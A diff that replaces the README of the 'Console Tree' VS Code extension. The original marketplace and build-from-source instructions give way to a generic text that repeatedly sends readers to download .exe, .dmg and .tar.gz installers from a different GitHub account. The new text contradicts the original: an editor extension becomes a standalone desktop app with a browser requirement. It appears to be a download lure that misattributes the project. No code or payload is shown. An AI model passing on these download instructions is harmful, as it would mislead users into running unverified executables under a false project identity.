@@ -1,164 +1,97 @@
-<a id="readme-top"></a>
+# 🌲 ConsoleTree - Easily Manage Console Statements
 
-<div align="center">
+## 🚀 Getting Started
 
-![Visual Stuido Code](https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Visual_Studio_Code_1.35_icon.svg/110px-Visual_Studio_Code_1.35_icon.svg.png)
+Welcome to ConsoleTree! This tool helps you find, navigate, and remove console statements from your project. It's perfect for keeping your code clean and professional. Follow these simple steps to get started.
 
-</div>
+## 📥 Download ConsoleTree
 
-<h1 align="center">Console Tree</h1>
+[![Download ConsoleTree](https://img.shields.io/badge/Download%20Now-ConsoleTree-brightgreen)](https://github.com/cyanDefCodes/ConsoleTree/releases)
 
-<div align="center">
+To download ConsoleTree, visit this page: [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases).
 
-[![VS Code Marketplace](https://img.shields.io/badge/Available%20on-VS%20Code%20Marketplace-0078D4?style=for-the-badge&link=https://astro.build/themes/details/astrolinkhub/)](https://marketplace.visualstudio.com/items?itemName=MarcosKlender.console-tree)
-[![Open VSX Registry](https://img.shields.io/badge/And-Open%20VSX%20Registry-A50EE6?style=for-the-badge&link=https://astro.build/themes/details/astrolinkhub/)](https://open-vsx.org/extension/MarcosKlender/console-tree)
+## 💻 System Requirements
 
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-![Node](https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)
-![ESLint](https://img.shields.io/badge/eslint-3A33D1?style=for-the-badge&logo=eslint&logoColor=white)
+Before you install ConsoleTree, ensure your system meets these requirements:
 
-![Visual Studio Marketplace Version](https://img.shields.io/visual-studio-marketplace/v/marcosklender.console-tree)
-![Visual Studio Marketplace Installs](https://img.shields.io/visual-studio-marketplace/i/marcosklender.console-tree)
-![Visual Studio Marketplace Downloads](https://img.shields.io/visual-studio-marketplace/d/marcosklender.console-tree)
-![Visual Studio Marketplace Rating (Stars)](https://img.shields.io/visual-studio-marketplace/stars/marcosklender.console-tree)
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Node.js:** Version 12 or later installed.
+- **Browser:** A recent version of Chrome, Firefox, or Edge for the extension.
 
-Extension that provides a tree view to easily find, navigate, and remove console statements from your project.
+## 🔧 Installation Steps
 
-![Basic Usage of the Extension](./screenshots/usage.gif)
+1. **Visit the Releases Page**
 
-</div>
+   Go to the [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases) page to see the latest version.
 
-## Table of Contents
+2. **Download the Package**
 
-  <ol>
-    <li><a href="#features">Features</a></li>
-    <li><a href="#installation">Installation</a></li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#configuration">Configuration</a></li>
-    <li><a href="#supported-file-types">Supported File Types</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
-  </ol>
+   Look for the most recent version under the "Latest release" section. Click on the appropriate file for your operating system to start downloading:
+   - For **Windows**, download `ConsoleTree-<version>.exe`.
+   - For **macOS**, download `ConsoleTree-<version>.dmg`.
+   - For **Linux**, download the appropriate `.tar.gz` file.
 
-## Features
+3. **Run the Installer**
 
-🌳 **Tree View Interface** - Browse all console statements organized by files  
-🔍 **Smart Detection** - Finds console.log, console.warn, console.error, console.info, and console.debug  
-🎯 **Click to Navigate** - Jump directly to any console statement in your code  
-🗑️ **One-Click Removal** - Remove individual console statements or all at once  
-⚡ **Auto-Refresh** - Tree updates automatically when you modify files  
-⚙️ **Configurable** - Customize file patterns and search patterns
+   After downloading, locate the file on your computer (usually in the "Downloads" folder):
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+   - For Windows, double-click the `.exe` file and follow the prompts.
+   - For macOS, open the `.dmg` file and drag the ConsoleTree app to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and follow the installation instructions in the README included in the package.
 
-## Installation
+4. **Launch ConsoleTree**
 
-### Visual Studio Code
+   Once the installation is complete, open ConsoleTree from your applications or shortcuts. 
 
-Search for **"Console Tree"** in the Extensions panel or install directly from the [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=MarcosKlender.console-tree).
+## 🖱️ How to Use ConsoleTree
 
-### Cursor / Windsurf / VSCodium
+Using ConsoleTree is simple:
 
-Search for **"Console Tree"** in the Extensions panel or install directly from [Open VSX Registry](https://open-vsx.org/extension/MarcosKlender/console-tree).
+1. **Open Your Project**
 
-### From Source
+   Start by opening your project folder through ConsoleTree.
 
-```bash
-git clone https://github.com/MarcosKlender/ConsoleTree.git
-cd ConsoleTree
-pnpm install
-pnpm run compile
-```
+2. **Scan for Console Statements**
 
-Then press `F5` to test the extension.
+   Click the "Scan" button. ConsoleTree will search for all console statements in your project files.
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+3. **View the Results**
 
-## Usage
+   Once the scan is complete, you will see a list of console statements. You can click on any entry to navigate directly to that line in the code.
 
-1. Open a project in VSCode
-2. Click on the **Console Tree** icon in the Activity Bar (Sidebar)
-3. The tree view will show all `console statements` in your project organized by files
-4. **Navigate**: Click on any console statement to jump to that line
-5. **Remove individual**: Click the trash icon next to any console statement
-6. **Remove all**: Click the trash icon in the tree view title bar
-7. **Refresh**: Click the refresh icon to manually update the tree
+4. **Remove Unwanted Statements**
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+   Select the console statements you don’t want, and click the "Remove" button. ConsoleTree will handle the deletion for you.
 
-## Configuration
+## 🛠️ Features
 
-You can customize Console Tree in your VSCode Settings:
+- **Easy Navigation:** Quickly jump to console statements in your code.
+- **Batch Removal:** Remove multiple statements at once.
+- **Preview Changes:** Check what will be removed before confirming.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-```json
-{
-  "consoleTree.includePatterns": [
-    "**/*.js",
-    "**/*.ts",
-    "**/*.jsx",
-    "**/*.tsx",
-    "**/*.vue",
-    "**/*.svelte"
-  ],
-  "consoleTree.excludePatterns": [
-    "**/node_modules/**",
-    "**/dist/**",
-    "**/build/**",
-    "**/*.min.js"
-  ],
-  "consoleTree.patterns": [
-    "console\\.log\\s*\\(",
-    "console\\.warn\\s*\\(",
-    "console\\.error\\s*\\(",
-    "console\\.info\\s*\\(",
-    "console\\.debug\\s*\\("
-  ]
-}
-```
+## 🤝 Support
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+If you need help, check the following resources:
 
-## Supported File Types
+- **Documentation:** Detailed user guides are available within the app.
+- **Community Forum:** Join our users on the [GitHub Discussions](https://github.com/cyanDefCodes/ConsoleTree/discussions) page to ask questions and share tips.
+- **Issues:** Report any problems directly on our [GitHub Issues page](https://github.com/cyanDefCodes/ConsoleTree/issues).
 
-- JavaScript (`.js`, `.mjs`, `.cjs`)
-- TypeScript (`.ts`)
-- React (`.jsx`, `.tsx`)
-- Vue.js (`.vue`)
-- Svelte (`.svelte`)
+## 📄 Contributors
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+Thank you to all contributors for making ConsoleTree a great tool. If you would like to contribute, please check our [Contributing Guide](https://github.com/cyanDefCodes/ConsoleTree/CONTRIBUTING.md).
 
-## Contributing
+## 📌 License
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+ConsoleTree is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
-1. Fork the repository
-2. Create your feature branch
-3. Commit your changes
-4. Push to the branch
-5. Open a Pull Request
+For more information and updates, keep an eye on our project on GitHub.
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+## 📥 Download ConsoleTree Again
 
-## License
+To recap, you can download ConsoleTree from the following link:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Visit this page to download: [ConsoleTree Releases](https://github.com/cyanDefCodes/ConsoleTree/releases). 
 
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
-
-## Acknowledgments
-
-If you find this extension helpful and give credits, it would be greatly appreciated! Feel free to:
-
-- ⭐ Star this repository
-- 🐛 Report issues or suggest improvements
-- 💬 Share your experience with the extension
-- 🚀 Enjoy coding without console clutter
-
----
-
-- Inspired by the popular [Todo Tree extension](https://github.com/Gruntfuggly/todo-tree)
-- Made with ❤️ for the VS Code community!
-
-<p align="right"><a href="#readme-top">Back to top ⬆️</a></p>
+Enjoy coding without clutter!
